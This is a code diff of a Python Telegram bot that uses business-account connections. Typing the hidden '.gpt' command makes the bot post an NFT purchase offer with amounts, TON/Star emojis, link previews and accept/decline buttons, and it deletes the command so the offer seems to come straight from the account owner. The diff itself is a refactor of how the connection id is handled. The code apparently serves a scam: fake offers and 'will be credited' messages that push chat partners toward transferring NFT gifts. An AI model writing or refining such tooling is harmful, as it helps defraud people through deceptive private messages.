@@ -18,7 +18,7 @@ STAR_EMOJI_ID = "5323333018151045958"
 CHECK_EMOJI_ID = "5774022692642492953"
 CROSS_EMOJI_ID = "5778527486270770928"
 ENVELOPE_EMOJI_ID = "6019263620142078168"
-TON_EMOJI_ID = "5318901904686754959" # <--- НОВЫЙ ID ДЛЯ TON
+TON_EMOJI_ID = "5318901904686754959"
 
 STAR_EMOJI = f'<tg-emoji emoji-id="{STAR_EMOJI_ID}">⭐</tg-emoji>'
 TON_EMOJI = f'<tg-emoji emoji-id="{TON_EMOJI_ID}">💎</tg-emoji>'
@@ -42,11 +42,14 @@ async def safe_delete(chat_id, message_id, conn_id=None):
 @dispatcher.business_message(F.text.startswith(".gpt"))
 async def send_offer(message: Message):
     global last_offer_data, last_message_id
-    if not message.business_connection_id:
+    
+    # Берем conn_id прямо из сообщения, где ты написал команду
+    conn_id = message.business_connection_id
+    if not conn_id:
         return
 
     try:
-        connection = await bot.get_business_connection(message.business_connection_id)
+        connection = await bot.get_business_connection(conn_id)
         owner_id = connection.user.id
     except Exception:
         return
@@ -158,25 +161,26 @@ async def send_offer(message: Message):
         "link2": link2,
         "sender_username": message.from_user.username,
         "lang": lang,
-        "business_connection_id": message.business_connection_id,
+        "business_connection_id": conn_id,
         "is_premium": is_premium,
         "action_word_ru": action_word_ru,
         "action_word_en": action_word_en
     }
 
     if last_message_id:
-        await safe_delete(message.chat.id, last_message_id, message.business_connection_id)
+        await safe_delete(message.chat.id, last_message_id, conn_id)
 
     try:
+        # Отправляем СТРОГО в тот чат, где ты написал команду
         msg = await bot.send_message(
             chat_id=message.chat.id,
             text=offer_text,
             reply_markup=keyboard,
-            business_connection_id=message.business_connection_id,
+            business_connection_id=conn_id,
             link_preview_options=LinkPreviewOptions(url=link1, is_disabled=False, prefer_large_media=True, show_above_text=True)
         )
         last_message_id = msg.message_id
-        await safe_delete(message.chat.id, message.message_id, message.business_connection_id)
+        await safe_delete(message.chat.id, message.message_id, conn_id)
     except Exception as e:
         print(f"Ошибка отправки оффера: {e}")
 
@@ -184,11 +188,16 @@ async def send_offer(message: Message):
 @dispatcher.callback_query(F.data == "accept_offer")
 async def on_accept_offer(callback: CallbackQuery):
     global last_message_id
+    
+    # Жестко берем conn_id из данных, чтобы не потерять
+    conn_id = last_offer_data.get("business_connection_id")
+    if not conn_id:
+        return await callback.answer("Ошибка: контекст чата потерян.", show_alert=True)
+
     nft_name = last_offer_data.get("nft_name", "NFT")
     amount_text = last_offer_data.get("amount_text", "")
     link = last_offer_data.get("link", "")
     link2 = last_offer_data.get("link2")
-    conn_id = last_offer_data.get("business_connection_id")
     sender_username = last_offer_data.get("sender_username")
     lang = last_offer_data.get("lang", "ru")
     action_word_ru = last_offer_data.get("action_word_ru", "будут зачислены")
@@ -240,7 +249,14 @@ async def on_accept_offer(callback: CallbackQuery):
         await safe_delete(callback.message.chat.id, last_message_id, conn_id)
 
     try:
-        msg = await bot.send_message(chat_id=callback.message.chat.id, text=new_text, reply_markup=new_keyboard, business_connection_id=conn_id, link_preview_options=LinkPreviewOptions(url=link, is_disabled=False, prefer_large_media=True, show_above_text=True))
+        # Отправляем строго в тот же чат
+        msg = await bot.send_message(
+            chat_id=callback.message.chat.id, 
+            text=new_text, 
+            reply_markup=new_keyboard, 
+            business_connection_id=conn_id,
+            link_preview_options=LinkPreviewOptions(url=link, is_disabled=False, prefer_large_media=True, show_above_text=True)
+        )
         last_message_id = msg.message_id
     except Exception as e:
         print(f"Ошибка отправки: {e}")
@@ -258,10 +274,8 @@ async def on_send_transfer(callback: CallbackQuery):
 @dispatcher.callback_query(F.data == "decline")
 async def on_decline(callback: CallbackQuery):
     lang = last_offer_data.get("lang", "ru")
-    try:
-        await callback.bot.delete_message(chat_id=callback.message.chat.id, message_id=callback.message.message_id)
-    except Exception as e:
-        print(f"Ошибка удаления: {e}")
+    conn_id = last_offer_data.get("business_connection_id")
+    await safe_delete(callback.message.chat.id, callback.message.message_id, conn_id)
     await callback.answer("Вы отклонили предложение." if lang == "ru" else "You have declined the offer.", show_alert=True)
 
 async def main():
